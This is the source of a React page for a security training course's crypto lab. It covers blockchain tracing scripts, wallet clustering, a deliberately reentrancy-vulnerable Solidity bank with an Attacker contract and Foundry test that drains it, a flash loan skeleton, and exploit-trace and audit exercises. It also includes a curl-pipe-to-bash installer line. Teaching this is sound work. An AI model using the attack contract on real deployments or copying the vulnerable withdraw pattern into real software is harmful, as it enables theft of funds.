'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: '#ffb347', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: 'rgba(255,179,71,0.1)', border: '1px solid rgba(255,179,71,0.3)', padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.82rem', fontWeight: 600, color: '#cc7a00', marginTop: '1.75rem', marginBottom: '0.6rem' }}>▸ {children}</h3>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #2e1e00', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#ffb347', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'objective' | 'warn'; children: React.ReactNode }) => {
  const c = type === 'warn' ? ['#ff4136', 'rgba(255,65,54,0.05)', 'IMPORTANT'] : ['#ffb347', 'rgba(255,179,71,0.05)', 'OBJECTIVE']
  return (
    <div style={{ background: c[1], borderLeft: `3px solid ${c[0]}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: `1px solid ${c[0]}33`, borderLeftColor: c[0] }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: c[0], letterSpacing: '0.2em', marginBottom: '6px' }}>{c[2]}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

export default function CryptoLab() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/crypto" style={{ color: '#5a7a5a', textDecoration: 'none' }}>MOD-03 // CRYPTO</Link>
        <span>›</span>
        <span style={{ color: '#ffb347' }}>LAB</span>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 03 · LAB ENVIRONMENT</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: '#ffb347', margin: '0.5rem 0', textShadow: '0 0 20px rgba(255,179,71,0.3)' }}>CRYPTO LAB — PRACTICAL EXERCISES</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', lineHeight: 1.6 }}>6 labs: transaction tracing · wallet analysis · smart contract auditing · DeFi exploit reproduction · forensic tooling</p>
      </div>

      <Alert type="warn">All contract exploitation labs use testnets or local environments only. Never deploy attack contracts to mainnet. For on-chain tracing exercises, we use publicly available historical data — all legal research.</Alert>

      {/* LAB 01 */}
      <H2 num="01">Transaction Tracing — Follow the Money</H2>
      <Alert type="objective">Manually trace a fund flow across multiple addresses using free blockchain explorers. Build a transaction graph. Identify exchange deposits.</Alert>

      <Pre label="// SETUP: Install blockchain forensics Python toolkit">{`pip install requests web3 pandas

# We'll build a basic tracer from scratch
# This is the same logic commercial tools use — just less automation`}</Pre>

      <Pre label="// BITCOIN TRACER — follow UTXO flows">{`import requests, json

def trace_bitcoin_address(address, depth=2):
    """Recursively trace Bitcoin address flows"""
    url = f"https://blockchair.com/bitcoin/dashboards/address/{address}"
    r = requests.get(url)
    data = r.json()["data"][address]
    
    print(f"\n{'='*60}")
    print(f"ADDRESS: {address}")
    print(f"Balance: {data['address']['balance'] / 1e8:.8f} BTC")
    print(f"Received: {data['address']['received'] / 1e8:.8f} BTC")
    print(f"Tx count: {data['address']['transaction_count']}")
    
    if depth == 0:
        return
    
    # Get transactions
    txs = data.get("transactions", [])[:5]  # first 5 txs
    for txid in txs:
        tx_url = f"https://blockchair.com/bitcoin/dashboards/transaction/{txid}"
        tx_r = requests.get(tx_url)
        tx_data = tx_r.json()["data"][txid]
        
        outputs = tx_data.get("outputs", [])
        for out in outputs:
            if out["recipient"] != address:
                print(f"  → {out['recipient']}: {out['value']/1e8:.8f} BTC")

# Exercise: trace from this publicly known address
# (the address that received Silk Road seizure funds)
trace_bitcoin_address("1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX")`}</Pre>

      <Pre label="// ETHEREUM TRACER — follow ETH + token flows">{`from web3 import Web3
import requests

# Connect to Ethereum via public RPC (no API key)
w3 = Web3(Web3.HTTPProvider("https://eth.llamarpc.com"))
print("Connected:", w3.is_connected())

def get_eth_balance(address):
    bal = w3.eth.get_balance(address)
    return w3.from_wei(bal, 'ether')

def get_tx_history(address, limit=10):
    """Get recent transactions via Etherscan API (free)"""
    url = "https://api.etherscan.io/api"
    params = {
        "module": "account",
        "action": "txlist",
        "address": address,
        "startblock": 0,
        "endblock": 99999999,
        "sort": "desc",
        "apikey": "YourApiKeyToken",  # free key at etherscan.io
    }
    r = requests.get(url, params=params)
    txs = r.json().get("result", [])[:limit]
    for tx in txs:
        direction = "OUT" if tx["from"].lower() == address.lower() else "IN"
        value_eth = int(tx["value"]) / 1e18
        print(f"[{direction}] {tx['hash'][:20]}... | {value_eth:.4f} ETH | to: {tx['to']}")
    return txs

# Exercise: trace Ethereum's most famous hack address
# (The DAO attacker address)
addr = "0xbb9bc244d798123fde783fcc1c72d3bb8c189413"
print(f"Balance: {get_eth_balance(addr)} ETH")
get_tx_history(addr)`}</Pre>

      {/* LAB 02 */}
      <H2 num="02">Wallet Forensics — Address Clustering</H2>
      <Alert type="objective">Identify multiple addresses controlled by the same entity using common-input-ownership heuristic. Understand HD wallet derivation.</Alert>

      <Pre label="// HD WALLET KEY DERIVATION — understand what you're tracing">{`pip install mnemonic hdwallet

from hdwallet import HDWallet
from hdwallet.symbols import ETH

# Generate a new HD wallet (testnet/research only)
hd = HDWallet(symbol=ETH)
hd.from_mnemonic(
    mnemonic="abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about"
    # This is the standard TEST mnemonic — never use for real funds
)

# Derive first 5 Ethereum addresses from this seed
for i in range(5):
    hd.from_path(path=f"m/44'/60'/0'/0/{i}")
    print(f"Address {i}: {hd.address()}")
    print(f"Private: {hd.private_key()}")
    hd.clean_derivation()

# KEY INSIGHT:
# All 5 addresses above are controlled by the same seed phrase
# Blockchain analytics firms cluster these together
# If any one address is identified → all are linked`}</Pre>

      <Pre label="// COMMON INPUT OWNERSHIP HEURISTIC — manual demo">{`import requests

def find_common_input_clusters(txid):
    """If multiple inputs fund one tx, they likely share an owner"""
    url = f"https://blockchair.com/bitcoin/dashboards/transaction/{txid}"
    r = requests.get(url)
    data = r.json()["data"][txid]
    
    inputs = data.get("inputs", [])
    
    if len(inputs) > 1:
        addresses = [inp["recipient"] for inp in inputs]
        total_in = sum(inp["value"] for inp in inputs)
        print(f"CLUSTER DETECTED: {len(inputs)} inputs co-spending")
        print(f"Total input: {total_in/1e8:.8f} BTC")
        print("Likely same entity controls:")
        for addr in addresses:
            print(f"  - {addr}")
        return addresses
    else:
        print("Single input — no clustering info")
        return []

# Test with a known multi-input transaction
# Find any Bitcoin tx with multiple inputs on blockchair.com
# Paste the txid here:`}</Pre>

      {/* LAB 03 */}
      <H2 num="03">Smart Contract Vulnerability Lab</H2>
      <Alert type="objective">Deploy and exploit a reentrancy-vulnerable contract on a local testnet. Fix it. Run Slither against real contracts. Understand the full audit workflow.</Alert>

      <H3>Setup: Local Ethereum Testnet</H3>
      <Pre label="// FOUNDRY SETUP — local EVM for safe exploitation">{`# Install Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Verify
forge --version
cast --version
anvil --version

# Start local testnet (anvil)
anvil
# Output: 10 funded test accounts with private keys
# RPC: http://127.0.0.1:8545
# Chain ID: 31337`}</Pre>

      <Pre label="// CREATE A FOUNDRY PROJECT">{`forge init crypto_lab
cd crypto_lab

# Project structure:
# src/        → your contracts
# test/       → Foundry tests
# script/     → deployment scripts
# lib/        → dependencies`}</Pre>

      <H3>Deploy & Exploit Reentrancy</H3>
      <Pre label="// src/VulnerableBank.sol">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;  // old version — no overflow protection

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: sends ETH before updating state
    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] = 0;  // TOO LATE
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}`}</Pre>

      <Pre label="// src/Attacker.sol">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
    function getBalance() external view returns (uint256);
}

contract Attacker {
    IVulnerableBank public bank;
    address public owner;
    uint256 public attackCount;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        attackCount++;
        if (address(bank).balance >= 1 ether && attackCount < 5) {
            bank.withdraw();  // REENTER
        }
    }

    function drain() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}`}</Pre>

      <Pre label="// test/Reentrancy.t.sol — Foundry test">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/VulnerableBank.sol";
import "../src/Attacker.sol";

contract ReentrancyTest is Test {
    VulnerableBank bank;
    Attacker attacker;
    address victim = address(0x1);
    address attackerEOA = address(0x2);

    function setUp() public {
        bank = new VulnerableBank();
        attacker = new Attacker(address(bank));
        
        // Victim deposits 5 ETH
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        bank.deposit{value: 5 ether}();
    }

    function testReentrancyAttack() public {
        console.log("Bank balance before:", bank.getBalance());
        console.log("Attacker balance before:", address(attacker).balance);
        
        vm.deal(attackerEOA, 1 ether);
        vm.prank(attackerEOA);
        attacker.attack{value: 1 ether}();
        
        console.log("Bank balance after:", bank.getBalance());
        console.log("Attacker balance after:", address(attacker).balance);
        
        // Bank should be drained
        assertEq(bank.getBalance(), 0);
        assertGt(address(attacker).balance, 1 ether);
    }
}

// Run: forge test --match-test testReentrancyAttack -vvvv`}</Pre>

      <Pre label="// SLITHER — run static analysis">{`pip install slither-analyzer

# Analyse the vulnerable contract
slither src/VulnerableBank.sol

# Expected output:
# VulnerableBank.withdraw() (src/VulnerableBank.sol#12-19)
#   Reentrancy in VulnerableBank.withdraw():
#   External calls: (success) = msg.sender.call{value: amount}("")
#   State variables written after the call: balances[msg.sender] = 0
# Reference: https://github.com/crytic/slither/wiki/Detector-Documentation#reentrancy-vulnerabilities

# Run all detectors with human-readable output:
slither . --print human-summary

# Check only high-severity:
slither . --detect reentrancy-eth,reentrancy-no-eth,suicidal,controlled-delegatecall`}</Pre>

      {/* LAB 04 */}
      <H2 num="04">DeFi Exploit Reproduction — Flash Loan Lab</H2>
      <Alert type="objective">Reproduce a simplified flash loan price manipulation attack on a local testnet using Foundry fork mode. This is exactly how security researchers validate vulnerabilities.</Alert>

      <Pre label="// FOUNDRY FORK MODE — test against real mainnet state">{`# Fork mainnet at a specific block (historical state preserved)
anvil --fork-url https://eth.llamarpc.com --fork-block-number 18000000

# Or via forge test:
# forge test --fork-url https://eth.llamarpc.com --match-test testFlashLoan -vvvv

# In your test file, this gives you access to:
# - Real Uniswap pools with real liquidity
# - Real Aave contracts with real funds available
# - Real token balances at that block
# Perfect for reproducing historical exploits`}</Pre>

      <Pre label="// SIMPLIFIED FLASH LOAN DEMO CONTRACT">{`// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IFlashLender {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

contract FlashLoanResearcher {
    address public owner;
    
    constructor() { owner = msg.sender; }

    // Called by the flash loan provider after sending funds
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        
        uint256 balance = IERC20(token).balanceOf(address(this));
        // At this point: we have 'amount' tokens with no collateral
        // Everything done here happens in one atomic transaction
        
        // RESEARCH STEP: decode 'data' to understand what to do with funds
        // (swap, manipulate price, exploit target protocol, etc.)
        
        // Must repay: amount + fee
        IERC20(token).transfer(msg.sender, amount + fee);
        
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}`}</Pre>

      {/* LAB 05 */}
      <H2 num="05">On-Chain Forensics — Reproduce an Exploit Trace</H2>
      <Alert type="objective">Use Tenderly and Phalcon to trace a real historical DeFi exploit transaction. Understand every call, every token movement, every state change.</Alert>

      <Pre label="// TRACE THE EULER FINANCE HACK (March 2023, $197M)">{`# Transaction hash of the main exploit:
# 0xc310a0affe2169d1f6feec1c63dbc7f7c62a887ad7a5de5f7b2c9fe93c54dcf4

# Step 1: Open Tenderly
# https://dashboard.tenderly.co/tx/mainnet/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887ad7a5de5f7b2c9fe93c54dcf4
# → Full call tree showing every function call
# → State changes per address
# → Token balance changes

# Step 2: Open Phalcon Explorer
# https://explorer.phalcon.xyz/tx/eth/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887ad7a5de5f7b2c9fe93c54dcf4
# → Fund flow diagram (visual)
# → Balance changes in/out for each address
# → Function invocations in sequence

# Step 3: Reconstruct the attack sequence
# From the trace, document:
# 1. What flash loan was taken? From where? How much?
# 2. What was the vulnerable function called?
# 3. What was the logical flaw?
# 4. How were funds extracted?
# 5. How was the flash loan repaid?

# Step 4: Read the post-mortem
# Euler Finance: https://medium.com/@euler_mav/post-mortem-e
# Rekt.news: https://rekt.news/euler-rekt/

# Exercise: repeat for these exploits:
# Mango Markets: 0xa9ff2b587e2... (search on Phalcon)
# KyberSwap: search Phalcon for November 2023`}</Pre>

      {/* LAB 06 */}
      <H2 num="06">Build a Mini Audit Report</H2>
      <Alert type="objective">Run a full audit workflow on an open-source DeFi contract. Use Slither + Mythril + manual review. Write a structured finding report.</Alert>

      <Pre label="// AUDIT A REAL CONTRACT — step by step">{`# 1. Find a target: use a CTF or practice audit
# Damn Vulnerable DeFi: https://www.damnvulnerabledefi.xyz
# Capture The Ether: https://capturetheether.com
# Ethernaut (OpenZeppelin): https://ethernaut.openzeppelin.com

# 2. Clone Damn Vulnerable DeFi (excellent practice)
git clone https://github.com/tinchoabbate/damn-vulnerable-defi
cd damn-vulnerable-defi
npm install

# 3. Run automated tools on the contracts
pip install slither-analyzer mythril
slither contracts/ --exclude-dependencies
myth analyze contracts/unstoppable/UnstoppableVault.sol

# 4. Document findings in this format:
cat > finding_template.md << 'EOF'
# [SEVERITY] Finding Title

## Summary
One sentence description.

## Vulnerability Details
Explain the root cause.

## Impact
What can an attacker do? What is lost?

## Proof of Concept
\`\`\`solidity
// Exploit code here
\`\`\`

## Recommended Fix
\`\`\`solidity
// Fixed code here
\`\`\`

## References
- Link to similar CVEs or past exploits
EOF

# 5. Solve the Damn Vulnerable DeFi challenge
# The solution IS the exploit — you've written a working PoC
# This is exactly what a professional auditor does`}</Pre>

      {/* Challenge */}
      <div style={{ marginTop: '3rem', background: '#0e1005', border: '1px solid rgba(255,179,71,0.2)', borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#cc7a00', letterSpacing: '0.2em', marginBottom: '1rem' }}>LAB CHALLENGE — SELF ASSESSMENT</div>
        {[
          'Trace the Silk Road Bitcoin wallet — how many hops to the first exchange deposit?',
          'What is the change address in a Bitcoin transaction, and how do you identify it?',
          'Explain why the Euler hack\'s missing health check enabled undercollateralised positions.',
          'Write a fixed version of the reentrancy vulnerable contract using the CEI pattern.',
          'What is the difference between a token\'s transfer() function and a native ETH transfer?',
          'Why do flash loan attacks cost near-zero capital to attempt? What is the only cost?',
          'Solve the first 5 levels of Ethernaut — each is a real vulnerability class.',
        ].map((q, i) => (
          <div key={i} style={{ display: 'flex', gap: '10px', padding: '8px 0', borderBottom: '1px solid #0a1005', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem' }}>
            <span style={{ color: '#ffb347', flexShrink: 0 }}>{String(i + 1).padStart(2, '0')}.</span>
            <span style={{ color: '#5a7a5a' }}>{q}</span>
          </div>
        ))}
      </div>

      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #2e1e00', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <Link href="/modules/crypto" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← BACK TO CONCEPT</Link>
        <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#ffb347', padding: '8px 20px', border: '1px solid rgba(255,179,71,0.4)', borderRadius: '4px', background: 'rgba(255,179,71,0.06)' }}>
          NEXT MODULE: OFFENSIVE SECURITY →
        </Link>
      </div>
    </div>
  )
}
